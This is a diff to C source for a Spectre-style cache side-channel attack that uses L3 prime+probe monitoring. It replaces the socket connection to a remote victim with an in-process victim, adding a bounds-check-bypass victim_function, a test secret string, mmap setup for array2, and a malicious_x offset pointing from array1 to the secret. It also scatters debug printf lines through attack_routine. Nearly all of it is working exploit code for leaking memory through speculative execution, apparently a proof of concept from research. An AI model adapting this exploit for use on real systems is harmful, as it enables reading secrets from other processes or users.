@@ -20,6 +20,10 @@
 #include <sys/timeb.h>
 #include <limits.h>
 #include <sys/stat.h>
+#include <sys/mman.h>
+
+
+
 
 // Victim Properties
 #define ARRAY1_SIZE 16 			//Debug
@@ -98,9 +102,32 @@ int S_array2_len = 0;
 int * S_array2_tmp;
 int S_array2_tmp_len=0;
 
+//SSSSSSSSSSSSSSSSSSSSSS
+char secret[] = "The Magic Words are Squeamish Ossifrage.";
+unsigned int array1_size = 16;
+uint8_t unused1[64];
+uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
+uint8_t unused2[64];
+uint8_t* array2 = MAP_FAILED;
+
+#ifdef MAP_HUGETLB
+#define HUGEPAGES MAP_HUGETLB
+#endif
 
 size_t malicious_x = 0;			//Attack victim via malicious_x
 
+
+uint8_t victim_function(size_t x)
+{
+	if (x < array1_size) {
+		memaccess(&array2[array1[x] * 256]);//MAGIC_BYTE;
+		return 0;
+	}
+	return 1;
+}
+
+
+//SSSSSSSSSSSSSSSSSSSS
 
 __always_inline int flush_set(int c){ // Flush set for cache
 	uint8_t res=0;
@@ -109,8 +136,11 @@ __always_inline int flush_set(int c){ // Flush set for cache
 	return res;
 }
 
+
 __always_inline void send_to_victim_x(size_t x){
-	send(target_sock , &x , sizeof(size_t) , 0);
+	// send(target_sock , &x , sizeof(size_t) , 0);
+	char result;
+	result = victim_function(x);
 }
 
 int guard(int n, char * err) { if (n == -1) { perror(err); exit(1); } return n; }
@@ -363,27 +393,38 @@ int find_sets_to_monitor(int set_offset,int* scores_ind, int * scores_ind_len, i
 
 
 int attack_routine(size_t x, unsigned char setup_flag) {
-	
+	printf("%d\n",S_array2_len);
 	float *scores = calloc(S_array2_len,sizeof(float));
+	printf("1\n");
 	float *scores_tmp = calloc(S_array2_len,sizeof(float));
+	printf("2\n");
 	int *num_of_comps = calloc(S_array2_len,sizeof(int));
+	printf("3\n");
 	int *num_of_comps_tmp = calloc(S_array2_len,sizeof(int));
-	int *scores_ind = calloc(tomonitor,sizeof(int));
+	printf("4\n");
+	printf("tomonitor:%d\n",tomonitor);
+	// int *scores_ind = calloc(tomonitor,sizeof(int));
+	int scores_ind[1];
+	printf("5\n");
 	int scores_ind_len;
 
+printf("adsdaa\n");
 
 	char ok = 0;
 
 	while(!ok){
+		printf("start!\n");
 		int scouted_sets = 0;			//Number of candidates sets
 
+        printf("array2_len:%d  tomo:%d\n",S_array2_len,tomonitor);
 		for(int set_offset=0; set_offset<S_array2_len/tomonitor; set_offset++){
-			
+			printf("loop\n");
 			bzero(scores_tmp,S_array2_len*sizeof(float));
 			bzero(num_of_comps_tmp,S_array2_len*sizeof(int));
 			bzero(scores_ind,tomonitor*sizeof(int));
 			scores_ind_len=0;
 			nmonitored = find_sets_to_monitor(set_offset,scores_ind,&scores_ind_len,&scouted_sets);
+			printf("nmonitored: %d\n\n",nmonitored);
 			if(nmonitored==0) break;
 
 			set_pp_params(1,samples,interval); 				// receive_signal start
@@ -391,7 +432,7 @@ int attack_routine(size_t x, unsigned char setup_flag) {
 			scoring(num_of_comps_tmp,scores_tmp,NULL,NULL,nmonitored,samples);
 
 			for(int i=0;i<nmonitored;i++){
-				//				printf("scores[%d] = %f += scores_tmp[%d] = %f\n",i,scores[i],i-set_offset*tomonitor, scores_tmp[i-set_offset*tomonitor]);
+								printf("scores[%d] = %f += scores_tmp[%d] = %f\n",i,scores[i],i-set_offset*tomonitor, scores_tmp[i-set_offset*tomonitor]);
 				scores[scores_ind[i]]+=scores_tmp[i];
 				num_of_comps[scores_ind[i]]+=num_of_comps_tmp[i];
 
@@ -431,7 +472,7 @@ int attack_routine(size_t x, unsigned char setup_flag) {
 	}
 
 
-	free(scores_ind);
+	// free(scores_ind);
 	free(scores);
 	free(scores_tmp);
 	free(num_of_comps);
@@ -578,6 +619,7 @@ void thread_setup(pthread_t * pp_thread){
 			exit(EXIT_FAILURE);
 		}
 
+    //    printf("hahahahahahahah\n");
 		set_pp_params(1,samples,interval);
 
 		//send x until pp end
@@ -625,27 +667,38 @@ int main(int argc, const char **argv)
 	S_array2_tmp = calloc(nsets,sizeof(int));
 	S_array2 = calloc(nsets,sizeof(int));
 
+// uint8_t unused1[64];
+// uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
+// uint8_t unused2[64];
+size_t malicious_x = (size_t)(secret - (char *)array1);
+	int bufsize = 1024*1024;
+	array2 = mmap(NULL, bufsize, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|HUGEPAGES, -1, 0);
+	if (MAP_FAILED == array2){
+		printf("Map Failed\n");
+		exit(EXIT_FAILURE);
+	}
+
 	printf("Sets : %d, Slices : %d\n",nsets,nslices); fflush(stdout);
 
 	for (int i = 0; i < nsets; i ++)
 		l3_monitor(l3,i);
 	l3_unmonitorall(l3);
 
-	//Create socket
-	guard(target_sock = socket(AF_INET , SOCK_STREAM , 0),"Could not create socket");
-	puts("Socket created");
-	server_struct.sin_addr.s_addr = inet_addr(VICTIM_IP);
-	server_struct.sin_family = AF_INET;
-	server_struct.sin_port = htons( VICTIM_PORT );
-	guard(connect(target_sock , (struct sockaddr *)&server_struct , sizeof(server_struct)),"Could not connect");
-	puts("Connected");
+	// //Create socket
+	// guard(target_sock = socket(AF_INET , SOCK_STREAM , 0),"Could not create socket");
+	// puts("Socket created");
+	// server_struct.sin_addr.s_addr = inet_addr(VICTIM_IP);
+	// server_struct.sin_family = AF_INET;
+	// server_struct.sin_port = htons( VICTIM_PORT );
+	// guard(connect(target_sock , (struct sockaddr *)&server_struct , sizeof(server_struct)),"Could not connect");
+	// puts("Connected");
 
 
 	pthread_t pp_thread;
 	thread_setup(&pp_thread);
 
 	array1_size_set = 0;
-	attack_length = 1;
+	attack_length = 10;
 	if (argc > 1)
 		malicious_x = strtoul(argv[1],NULL,10);
 	if (argc > 2)
@@ -730,6 +783,7 @@ int main(int argc, const char **argv)
 				int diff = 0;
 				unsigned char setup_flag=1;
 				size_t x = uint64Input();
+				printf("%d\n",nsets);
 				for(int i=0;i<nsets;i++) S_array2[i]=i;
 				S_array2_len = nsets;
 				
@@ -777,6 +831,7 @@ int main(int argc, const char **argv)
 					bzero(suspected_sets,nsets*sizeof(unsigned char));
 					printf("Reading at malicious_x = %lu\n", malicious_x + i); fflush(stdout);
 					ftime(&start);
+					printf("xxxxx\n");
 					attack_routine(malicious_x + i,setup_flag);
 					ftime(&end);
 					diff = (int) (1000.0 * (end.time - start.time) + (end.millitm - start.millitm));
@@ -875,6 +930,7 @@ int main(int argc, const char **argv)
 			break;
 		case 99:
 			printf("Exit... \n");
+			//send_to_victim_x(1234);
 			break;
 		}
 
@@ -885,7 +941,7 @@ int main(int argc, const char **argv)
 	free(S_array2_tmp);
 	free(monitoredlines);
 	free(suspected_sets);
-	close(target_sock);
+	// close(target_sock);
 	l3_release(l3);
 
 	return EXIT_SUCCESS;
